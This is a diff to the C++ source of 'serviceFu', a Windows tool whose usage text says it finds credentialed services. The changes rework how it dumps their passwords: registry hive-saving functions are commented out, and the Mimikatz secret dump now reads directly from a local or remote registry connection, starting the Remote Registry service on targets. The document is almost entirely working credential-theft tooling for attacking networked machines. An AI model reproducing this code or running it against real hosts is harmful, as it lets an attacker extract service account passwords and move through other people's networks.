@@ -19,6 +19,8 @@
 #include "debug.h"
 #include "utils.h"
 
+#define	SYSKEY_LENGTH	16
+
 #ifdef MIMIKATZLIB
 #include "lsadumpsecrets.h"
 #endif
@@ -328,132 +330,132 @@ void parse_ignore_file(std::string inputFile)
 	}
 }
 
-std::vector<std::string> save_local_reg_hive(std::string destDir)
-{
-	std::vector<std::string> savedFiles;
+//std::vector<std::string> save_local_reg_hive(std::string destDir)
+//{
+//	std::vector<std::string> savedFiles;
+//
+//	//Security hive
+//	HKEY securityHive;
+//	LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Security", 0, 0x20000, &securityHive);
+//	if(ret == ERROR_SUCCESS) {
+//
+//		std::string filepath = destDir + "\\sec.hiv";
+//		ret = RegSaveKeyA(securityHive, filepath.c_str(), NULL);
+//		if(ret != ERROR_SUCCESS) {
+//			printf("[-] Error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
+//		}
+//		else {
+//			savedFiles.push_back(filepath);
+//		}
+//
+//		RegCloseKey(securityHive);
+//	}
+//	else {
+//		printf("[-] Error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SECURITY %s\n", GetLastErrorAsString(ret).c_str());
+//	}
+//
+//	//System hive
+//	HKEY systemHive;
+//	ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "System", 0, 0x20000, &systemHive);
+//	if(ret == ERROR_SUCCESS) {
+//
+//		std::string filepath = destDir + "\\sys.hiv";
+//		ret = RegSaveKeyA(systemHive, filepath.c_str(), NULL);
+//		if(ret != ERROR_SUCCESS) {
+//			printf("[-] Error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
+//		}
+//		else {
+//			savedFiles.push_back(filepath);
+//		}
+//
+//		RegCloseKey(systemHive);
+//	}
+//	else {
+//		printf("[-] Error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SYSTEM %s\n", GetLastErrorAsString(ret).c_str());
+//	}
+//
+//	return savedFiles;
+//}
 
-	//Security hive
-	HKEY securityHive;
-	LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Security", 0, 0x20000, &securityHive);
-	if(ret == ERROR_SUCCESS) {
-
-		std::string filepath = destDir + "\\sec.hiv";
-		ret = RegSaveKeyA(securityHive, filepath.c_str(), NULL);
-		if(ret != ERROR_SUCCESS) {
-			printf("[-] Error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
-		}
-		else {
-			savedFiles.push_back(filepath);
-		}
-
-		RegCloseKey(securityHive);
-	}
-	else {
-		printf("[-] Error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SECURITY %s\n", GetLastErrorAsString(ret).c_str());
-	}
-
-	//System hive
-	HKEY systemHive;
-	ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "System", 0, 0x20000, &systemHive);
-	if(ret == ERROR_SUCCESS) {
-
-		std::string filepath = destDir + "\\sys.hiv";
-		ret = RegSaveKeyA(systemHive, filepath.c_str(), NULL);
-		if(ret != ERROR_SUCCESS) {
-			printf("[-] Error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
-		}
-		else {
-			savedFiles.push_back(filepath);
-		}
-
-		RegCloseKey(systemHive);
-	}
-	else {
-		printf("[-] Error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SYSTEM %s\n", GetLastErrorAsString(ret).c_str());
-	}
-
-	return savedFiles;
-}
-
-std::vector<std::string> save_remote_reg_hive(std::string target, std::string destDir)
-{
-	std::vector<std::string> savedFiles;
-
-	std::string SecurityHiveStr = target + "_Security.hiv";
-	std::string SystemHiveStr = target + "_System.hiv";
-	std::string conn = "\\\\" + target;
-
-	HKEY theKey;
-	LONG ret = RegConnectRegistryA(conn.c_str(), HKEY_LOCAL_MACHINE, &theKey);
-	if(ret == ERROR_SUCCESS) {
-		std::string filePathRemote, filePathLocal;
-
-		//Security hive
-		HKEY securityHive;
-		ret = RegOpenKeyExA(theKey, "Security", 0, 0x20000, &securityHive);
-		if(ret == ERROR_SUCCESS) {
-
-			ret = RegSaveKeyA(securityHive, "sec.hiv", NULL);
-			if(ret == ERROR_SUCCESS) {
-				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sec.hiv";
-				filePathLocal = destDir + "\\" + SecurityHiveStr;
-
-				//Overwrite so it shouldn't fail
-				BOOL ret2 = MoveFileExA(filePathRemote.c_str(), filePathLocal.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
-				if(ret2 == FALSE) {
-					printf("[-] Error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
-					DeleteFileA(filePathRemote.c_str());
-				}
-				else {
-					savedFiles.push_back(filePathLocal);
-				}
-			}
-			else {
-				printf("[-] Error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(GetLastError()).c_str());
-			}
-
-			RegCloseKey(securityHive);
-		}
-		else {
-			printf("[-] Error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
-		}
-
-		//System hive
-		HKEY systemHive;
-		ret = RegOpenKeyExA(theKey, "System", 0, 0x20000, &systemHive);
-		if(ret == ERROR_SUCCESS) {
-			ret = RegSaveKeyA(systemHive, "sys.hiv", NULL);
-			if(ret == ERROR_SUCCESS) {
-				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sys.hiv";
-				filePathLocal = destDir + "\\" + SystemHiveStr;
-
-				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
-				if(ret2 == FALSE) {
-					printf("[-] Error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
-					DeleteFileA(filePathRemote.c_str());
-				}
-				else {
-					savedFiles.push_back(filePathLocal);
-				}
-			}
-			else {
-				printf("[-] Error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
-			}
-
-			RegCloseKey(systemHive);
-		}
-		else {
-			printf("[-] Error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
-		}
-
-		RegCloseKey(theKey);
-	}
-	else {
-		printf("[-] Error RegConnectRegistryA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
-	}
-
-	return savedFiles;
-}
+//std::vector<std::string> save_remote_reg_hive(std::string target, std::string destDir)
+//{
+//	std::vector<std::string> savedFiles;
+//
+//	std::string SecurityHiveStr = target + "_Security.hiv";
+//	std::string SystemHiveStr = target + "_System.hiv";
+//	std::string conn = "\\\\" + target;
+//
+//	HKEY theKey;
+//	LONG ret = RegConnectRegistryA(conn.c_str(), HKEY_LOCAL_MACHINE, &theKey);
+//	if(ret == ERROR_SUCCESS) {
+//		std::string filePathRemote, filePathLocal;
+//
+//		//Security hive
+//		HKEY securityHive;
+//		ret = RegOpenKeyExA(theKey, "Security", 0, 0x20000, &securityHive);
+//		if(ret == ERROR_SUCCESS) {
+//
+//			ret = RegSaveKeyA(securityHive, "sec.hiv", NULL);
+//			if(ret == ERROR_SUCCESS) {
+//				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sec.hiv";
+//				filePathLocal = destDir + "\\" + SecurityHiveStr;
+//
+//				//Overwrite so it shouldn't fail
+//				BOOL ret2 = MoveFileExA(filePathRemote.c_str(), filePathLocal.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
+//				if(ret2 == FALSE) {
+//					printf("[-] Error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
+//					DeleteFileA(filePathRemote.c_str());
+//				}
+//				else {
+//					savedFiles.push_back(filePathLocal);
+//				}
+//			}
+//			else {
+//				printf("[-] Error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(GetLastError()).c_str());
+//			}
+//
+//			RegCloseKey(securityHive);
+//		}
+//		else {
+//			printf("[-] Error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
+//		}
+//
+//		//System hive
+//		HKEY systemHive;
+//		ret = RegOpenKeyExA(theKey, "System", 0, 0x20000, &systemHive);
+//		if(ret == ERROR_SUCCESS) {
+//			ret = RegSaveKeyA(systemHive, "sys.hiv", NULL);
+//			if(ret == ERROR_SUCCESS) {
+//				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sys.hiv";
+//				filePathLocal = destDir + "\\" + SystemHiveStr;
+//
+//				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
+//				if(ret2 == FALSE) {
+//					printf("[-] Error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
+//					DeleteFileA(filePathRemote.c_str());
+//				}
+//				else {
+//					savedFiles.push_back(filePathLocal);
+//				}
+//			}
+//			else {
+//				printf("[-] Error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
+//			}
+//
+//			RegCloseKey(systemHive);
+//		}
+//		else {
+//			printf("[-] Error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
+//		}
+//
+//		RegCloseKey(theKey);
+//	}
+//	else {
+//		printf("[-] Error RegConnectRegistryA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
+//	}
+//
+//	return savedFiles;
+//}
 
 SC_HANDLE start_remote_registry_svc(SC_HANDLE sc, std::string target)
 {
@@ -485,7 +487,7 @@ SC_HANDLE start_remote_registry_svc(SC_HANDLE sc, std::string target)
 	return ret_svc;
 }
 
-void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, bool runMimikatz)
+void svcfu(std::vector<std::string> targets, bool runMimikatz)
 {
 	bool local = true;
 	PSVC_STRUCT *svc_arr = NULL;
@@ -521,35 +523,27 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, 
 		printf("[+] Credentialed services: %d\n", ret_size);
 					
 		//post processing logic (registry save, mimikatz, and cleanup)
-		std::vector<std::string> savedFiles;
 		SC_HANDLE remote_reg_svc = NULL;
-		if(saveReg) {
-			//if interesting service found
-			//if(ret_size > 0 ) {
-				
-			//Save registry hives for getting credentials
-			if(local) {
-				savedFiles = save_local_reg_hive(destDir);
-			} else {
-				remote_reg_svc = start_remote_registry_svc(sc, target);
-				savedFiles = save_remote_reg_hive(target, destDir);
-			}
-			//}
-
+		
+		
 			if(runMimikatz) {
-				//use mimikatz to obtain credentials
-#ifdef MIMIKATZLIB
-				if(savedFiles.size() > 1) {
-					//printf("[+] Mimikatz LSA Secrets Dump\n\n");
-					dump_svc_secrets(svc_arr, ret_size, savedFiles[1], savedFiles[0]);		
 
-					for(std::string file : savedFiles) {
-						DeleteFileA(file.c_str());
-					}
+				HKEY theKey = HKEY_LOCAL_MACHINE;
+				if(!local) {
 
-				} else {
-					printf("[-] Registry hive files not retrieved\n");
+					remote_reg_svc = start_remote_registry_svc(sc, target);
+					std::string conn = "\\\\" + target;
+					LONG ret = RegConnectRegistryA(conn.c_str(), HKEY_LOCAL_MACHINE, &theKey);
+					if(ret != ERROR_SUCCESS) {
+						printf("[-]Unable to connect to remote registry\n");
+						return;
+					}			
 				}
+				
+#ifdef MIMIKATZLIB
+				//use mimikatz to obtain credentials
+				dump_svc_secrets( theKey, svc_arr, ret_size );
+		
 #else
 				printf("[-] Mimikatz support not compiled in. Rebuild\n");
 #endif
@@ -561,7 +555,6 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, 
 				ControlService( remote_reg_svc, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp );
 			}
 
-		} 
 
 		//Print out passwords
 		for (DWORD j = 0; j != ret_size; j++) { 
@@ -580,8 +573,6 @@ void usage()
 	printf("\nserviceFu - Find credentialed services\n\n");
 	printf("Usage:\n");
 	printf("   -h              print usage menu\n");
-	printf("   -r              save registry hives\n");
-	printf("   -o directory    directory to write registry hives\n");
 	printf("   -i file         user accounts to ignore from results\n");
 	printf("   -m              use mimikatz to decrypt service credentials\n");
 	printf("   -t targets      target(s) - target computer(s) (default localhost).\n");
@@ -606,10 +597,8 @@ int main(int argc, char** argv)
 	initialize();
 
 	char* targetsInput = NULL;
-	char* outputDir = NULL;
 	char* ignoreFile = NULL;
 	bool runMimikatz = false;
-	bool saveReg = false;
 	bool forceSave = false;
 
 	//argument parsing
@@ -624,20 +613,12 @@ int main(int argc, char** argv)
 				if( optarg != NULL )
 					targetsInput = optarg;
 				break;
-			case 'o':
-				if( optarg != NULL )
-					outputDir = optarg;
-				break;
 			case 'i':
 				if( optarg != NULL )
 					ignoreFile = optarg;
 				break;
 			case 'm':
 				runMimikatz = true;
-				saveReg = true;
-				break;
-			case 'r':
-				saveReg = true;
 				break;
 			case '?':
 				printf("\n[-] Unrecognized option: %c\n\n", c);
@@ -664,20 +645,8 @@ int main(int argc, char** argv)
 		targets.push_back(std::string());
 	}
 
-	//parse user input: output directory
-	std::string destDir;
-	if(outputDir)
-		destDir = std::string(outputDir);
-	else {
-		outputDir = (char*)calloc(MAX_PATH+1, sizeof(char));
-		if(outputDir) {
-			GetCurrentDirectoryA(MAX_PATH, outputDir);
-			destDir = std::string(outputDir);
-		}
-	}
-
 	//main logic function
-	svcfu(targets, destDir, saveReg, runMimikatz);
+	svcfu(targets, runMimikatz);
 
 	return 0;
 }
